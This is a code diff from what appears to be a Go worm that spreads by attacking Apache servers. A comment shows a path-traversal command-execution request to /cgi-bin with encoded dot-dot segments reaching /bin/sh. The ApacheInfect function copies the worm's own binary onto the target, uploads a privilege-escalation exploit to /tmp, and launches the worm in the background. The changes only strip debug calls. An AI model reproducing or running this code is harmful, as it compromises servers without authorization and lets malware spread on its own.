@@ -6,7 +6,7 @@ import (
 	"net"
 	"encoding/base64"
 	"strings"
-	"os/exec"
+	"os"
 )
 
 //Command execution: curl -X POST localhost:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh -d 'echo;ls -l /tmp/worm | wc -l'
@@ -56,28 +56,23 @@ func ApacheCheckInfection(ip string, port string) bool {
 }
 
 func ApacheInfect(ip string, port string) bool {
-	test()
 
 	var worm []byte
 	worm = GetFile("/proc/self/exe")
 	worm64 := base64.StdEncoding.EncodeToString(worm)
 	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath)
 	MakeRequest(ip,port,commands)
-	
-	test()
 		
 	file := GetFile("./exploit_nss_manual")
 	file64 := base64.StdEncoding.EncodeToString(file)
 	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/exploit_nss_manual")
 	MakeRequest(ip,port,commands)
 	
-	test()
-	
 	commands = fmt.Sprintf("chmod u+x %s; nohup %s &", wormPath, wormPath)
 	commands = fmt.Sprintf(commandsTemplate,commands)
 	MakeRequest2(ip,port,commands)
 	
-	test("Hola")
+	test("Apache fi")
 	return ApacheCheckInfection(ip,port)
 }
 
